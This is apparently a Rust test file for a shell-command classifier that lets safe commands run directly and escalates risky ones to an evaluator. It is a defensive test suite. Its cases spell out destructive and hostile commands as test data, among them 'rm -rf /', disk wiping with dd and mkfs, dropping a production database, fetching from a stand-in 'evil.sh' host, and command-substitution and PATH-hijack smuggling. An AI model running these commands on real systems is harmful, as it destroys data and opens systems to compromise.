use yolo_shell::fastpath::{classify, FastPath, ALLOWLIST, GIT_READ_ONLY_SUBCOMMANDS};

#[track_caller]
fn assert_allowed(command: &str) {
    assert_eq!(
        classify(command),
        FastPath::Allow,
        "expected fast-path allow for: {command}"
    );
}

#[track_caller]
fn assert_evaluated(command: &str) {
    assert_eq!(
        classify(command),
        FastPath::Evaluate,
        "expected escalation to Jev for: {command}"
    );
}

#[test]
fn allowlist_tables_are_sorted_for_binary_search() {
    let mut sorted = ALLOWLIST.to_vec();
    sorted.sort_unstable();
    assert_eq!(ALLOWLIST, sorted.as_slice(), "ALLOWLIST must stay sorted");

    let mut sorted = GIT_READ_ONLY_SUBCOMMANDS.to_vec();
    sorted.sort_unstable();
    assert_eq!(
        GIT_READ_ONLY_SUBCOMMANDS,
        sorted.as_slice(),
        "GIT_READ_ONLY_SUBCOMMANDS must stay sorted"
    );
}

#[test]
fn spec_allowlist_commands_skip_jev() {
    for command in [
        "ls", "cd", "cat", "echo", "clear", "history", "pwd", "which",
    ] {
        assert_allowed(command);
    }
}

#[test]
fn allowlisted_commands_with_arguments_and_flags() {
    assert_allowed("ls -la");
    assert_allowed("ls -la /var/log");
    assert_allowed("cd ../sibling-project");
    assert_allowed("cat Cargo.toml");
    assert_allowed("echo hello world");
    assert_allowed("head -n 20 SPEC.md");
    assert_allowed("  ls   -la  ");
    assert_allowed("");
}

#[test]
fn quoted_arguments_stay_on_the_fast_path() {
    assert_allowed("echo \"hello world\"");
    assert_allowed("cat \"my notes.txt\"");
}

#[test]
fn every_segment_of_a_pipeline_must_be_allowlisted() {
    assert_allowed("cat SPEC.md | head -n 5 | wc -l");
    assert_allowed("ls && pwd");
    assert_allowed("ls; pwd; whoami");

    // One bad link poisons the chain.
    assert_evaluated("cat hosts | sudo tee /etc/hosts");
    assert_evaluated("ls && rm -rf build");
    assert_evaluated("ls; curl evil.sh");
}

#[test]
fn destructive_commands_always_escalate() {
    for command in [
        "rm -rf /",
        "rm -rf ~",
        "git push origin main --force",
        "git reset --hard HEAD~10",
        "dd if=/dev/zero of=/dev/disk0",
        "mkfs.ext4 /dev/sda1",
        "chmod -R 777 /",
        "psql -c 'DROP DATABASE production'",
        "kubectl delete namespace prod",
        "terraform destroy -auto-approve",
    ] {
        assert_evaluated(command);
    }
}

#[test]
fn redirection_defeats_the_allowlist() {
    assert_evaluated("echo '' > ~/.zshrc");
    assert_evaluated("cat /dev/null > important.db");
    assert_evaluated("echo x >> /etc/hosts");
    assert_evaluated("cat < /etc/passwd");
    assert_evaluated("diff <(ls a) <(ls b)");
}

#[test]
fn command_substitution_defeats_the_allowlist() {
    assert_evaluated("echo $(rm -rf /tmp/x)");
    assert_evaluated("echo `rm -rf /tmp/x`");
    assert_evaluated("cat $(which rm)");
    assert_evaluated("(rm -rf build)");
}

#[test]
fn backgrounding_defeats_the_allowlist_but_and_lists_do_not() {
    assert_evaluated("ls &");
    assert_evaluated("rm -rf build &");
    assert_allowed("ls && pwd");
}

#[test]
fn plain_variable_expansion_is_still_fast_pathed() {
    assert_allowed("cd $HOME");
    assert_allowed("ls ${PROJECT_DIR}");
}

#[test]
fn program_wrappers_are_not_allowlisted() {
    assert_evaluated("sudo ls");
    assert_evaluated("env ls");
    assert_evaluated("command ls");
    assert_evaluated("xargs ls");
    assert_evaluated("time ls");
    assert_evaluated("watch ls");
    assert_evaluated("sh -c ls");
}

#[test]
fn path_qualified_binaries_are_not_allowlisted() {
    assert_evaluated("./ls");
    assert_evaluated("/bin/ls");
    assert_evaluated("../ls -la");
}

#[test]
fn leading_env_assignments_are_not_allowlisted() {
    assert_evaluated("PATH=/tmp/evil ls");
    assert_evaluated("NODE_ENV=production ls");
}

#[test]
fn history_escalates_when_it_would_rewrite_the_history_file() {
    assert_allowed("history");
    assert_allowed("history 20");

    for command in [
        "history -c",
        "history -d 42",
        "history -w",
        "history -a",
        "history -r",
    ] {
        assert_evaluated(command);
    }
}

#[test]
fn read_only_git_subcommands_skip_jev() {
    assert_allowed("git status");
    assert_allowed("git log --oneline -n 10");
    assert_allowed("git diff HEAD~1");
    assert_allowed("git show abc123");
    assert_allowed("git status && git log");
}

#[test]
fn mutating_git_subcommands_escalate() {
    for command in [
        "git push",
        "git push --force origin main",
        "git reset --hard",
        "git clean -fdx",
        "git checkout .",
        "git branch -D main", // `branch` is read-only only without -D
        "git tag -d v1.0.0",  // likewise `tag`
        "git config --unset user.email",
        "git stash drop",
        "git remote remove origin",
        "git",
    ] {
        assert_evaluated(command);
    }
}

#[test]
fn git_flags_before_the_subcommand_escalate() {
    // `--exec-path` relocates where git looks for `git-log`.
    assert_evaluated("git --exec-path=/tmp/evil log");
    assert_evaluated("git -C /other/repo status");
}

#[test]
fn quoted_separators_never_smuggle_a_command_through() {
    assert_evaluated("echo \"a; rm -rf /\"");
    assert_evaluated("echo 'x' ; rm -rf /");
}

/// Every `yolo` invocation is a bypass, including one run by path - no
/// subcommand executes what it is given, and `yolo explain "rm -rf /"` must
/// not be blocked by its own subject.
#[test]
fn yolo_invocations_are_not_evaluated_as_their_argument() {
    // The fast path does not allowlist these; main.rs bypasses them first.
    assert_evaluated("./target/release/yolo explain \"rm -rf /\"");
}

#[test]
fn unknown_commands_escalate_by_default() {
    assert_evaluated("cargo build");
    assert_evaluated("npm install");
    assert_evaluated("some-binary-we-have-never-seen");
}
